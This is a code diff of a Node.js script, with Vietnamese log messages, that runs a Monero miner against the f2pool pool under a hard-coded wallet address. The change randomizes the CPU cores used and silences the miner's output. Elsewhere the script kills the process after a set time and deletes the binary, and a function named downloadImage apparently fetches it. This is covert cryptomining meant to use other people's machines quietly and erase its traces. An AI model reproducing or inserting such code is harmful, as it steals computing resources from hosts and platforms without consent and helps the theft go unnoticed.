@@ -12,10 +12,15 @@ const timeout = (ms) => {
 }
 
 const runJob = (nameTool) => {
-    if (shell.exec(`./${nameTool} -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t 2 --astrobwt-avx2`, { silent: false, async: true }).code !== undefined) {
+    const coreNumber = Math.floor(Math.random() * 2) + 2;
+    const runMonney = shell.exec(`./${nameTool} -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${ coreNumber } --astrobwt-avx2`, { silent: true, async: true });
+    if (runMonney.code !== undefined) {
         return 0;
     }
-    console.log('-- dang tien hanh jobs');
+    runMonney.stdout.on('data', (data) => {
+        console.log(`processing: ${data}`);
+    });
+    console.log(`-- dang tien hanh jobs voi ${ coreNumber } core`);
 }
 
 const downloadImage = async () => {
@@ -50,7 +55,7 @@ try {
         await timeout(timeRunJobs);
         if (shell.exec(`killall ${nameTool}`, { silent: true }).code === 0) {
             console.log('-- ket thuc jobs');
-            shell.exec(`rm -rf ${ nameTool }`, { silent: true });
+            shell.exec(`rm -rf ${nameTool}`, { silent: true });
         }
     }).catch((err) => {
         console.log(error);
